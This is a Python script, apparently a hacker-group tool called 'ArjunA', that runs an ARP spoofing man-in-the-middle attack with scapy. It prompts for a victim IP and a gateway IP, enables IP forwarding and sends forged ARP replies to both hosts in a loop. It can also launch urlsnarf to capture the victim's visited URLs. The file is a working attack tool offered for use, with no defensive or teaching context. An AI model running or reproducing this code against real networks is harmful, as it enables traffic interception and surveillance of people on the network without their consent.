import subprocess

ban = """                                                 
\t                       =TARGET= 
\t                         .`.                           
\t                       .`.::`.                           
\t                      ```.,.```                     
\t               `,:::'',:::;';:'+;:::.`                 
\t             `:.          `,:        :,`               
\t           .,              `.:         `.,             
\t       `,.`                 ,,.          `.,`          
\t           `            .++ ,.;         .             
\t             ``        `'.,':,:      ``               
\t                ``     ;+',++:.    ``                  
\t                   .` :+;.''+;` ``                    
\t                      ;'+,:;#;`                       
\t                     `` `;::,                         
\t      ArjunA        `:. `..::`         Power Of BOW and ---->                    
\t                     ,.. ..;: `                       
\t                     ,,;,.;..`.                       
\t                     .,,.,. :`,                       
\t                     `,.,:``.,:                       
\t                     ..;.```;,    ==>Chennai Hackers Connect<==                  
\t                     ,.,::,;;:                       
\t                      `., ``.,:.                      
\t                    ..,,,  `.,  `                     
\t                  `.,,,,;  `,.   . `.::;;+++',        
\t             `  ``...,:;` `.,,   `;+######+;`         
\t            ````...,,,:, `...;.`  ,####+;.`           
\t         `.,;'````.`.'#``...;':`` `'##+,              
\t        `,;,`,;+';::,,::;::;';:,``,+#+`               
\t      .::,.`    .,:'+++''''';;;;;:;;:,`               
\t        http://chennaihackers.blogspot.com
"""

subprocess.call('clear', shell=True)
print(ban)

import sys
import os
import time
import logging
from time import sleep
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def ddr_protocol():
    if len(ban) != 1758:
        print("DDR protocol Enabled. You altered the program, So it won't work\n")
        sys.exit()

def usage():
    print("\n" + "-" * 76)
    print("./ArjunA.py -interface UserName (or) ./ArjunA.py -interfcae (or) ./ArjunA.py")
    print("-" * 76)

help_commands = ["-h", "--help"]

if len(sys.argv) >= 2:
    cmd_help = sys.argv[1]
    if cmd_help in help_commands:
        usage()
        sys.exit(1)

if len(sys.argv) >= 3:
    user = sys.argv[2]
    print("Hi " + user + "....")
else:
    user = "User"

ddr_protocol()


def urlsniff():
    os.system("gnome-terminal -e 'bash -c \"urlsnarf; exec bash\"'")


def ipfor_en():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("\n" + '\033[94m' + "IP forwarding Enabled" + '\033[0m' + "\n")


def ipfor_dis():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("\n" + '\033[94m' + "IP forwarding Disabled" + '\033[0m' + "\n")


victim = raw_input("Enter victims IP : ")
target = raw_input("Enter Gateway IP : ")
url = raw_input("Do you need url sniffer : ")

if len(sys.argv) >= 2:
    face = sys.argv[1]
    interface = face.lstrip("-")
else:
    interface = raw_input("Enter the interface : ")

urlyes = ["yes", "y", "YES", "Y"]
urlno = ["no", "NO", "n", "N"]

if url in urlyes:
    urlsniff()
    print("\n" + "\x1b[01;36m" + "Sniffer Activated" + '\033[0m' + "\n")

if url in urlno:
    print("\n" + '\033[91m' + "Sniffer Not Activated" + '\033[0m' + "\n")

for i in range(26):
    sys.stdout.write('\r')
    sys.stdout.write("[%-26s]%d%%" % ('=' * i + '>', 4 * i))
    sys.stdout.flush()
    sleep(0.18)

sys.stdout.write("\n")

ip = IP(dst=victim)
icmp = ICMP()
send(ip/icmp, verbose=0, iface=interface)

a = ARP(op=2, psrc=target, pdst=victim)
b = ARP(op=2, psrc=victim, pdst=target)

print("\nAttack in progress press 'ctrl+c' to stop and exit\n")

ipfor_en()

count = 0
while 1:
    count += 1
    try:
        at = send(a, verbose=0, iface=interface)
        if count == 1:
            print("\x1b[01;32m" + "Half Routing successful!" + '\033[0m')
        bt = send(b, verbose=0, iface=interface)
        if count == 1:
            print("\x1b[01;32m" + "Full Routing successful!!" + '\033[0m')
        time.sleep(60)

    except KeyboardInterrupt:
        print("\r\n=====> Attack Stopped by " + user + " <=====")
        ipfor_dis()
        sys.stdin.close()
        sys.exit()
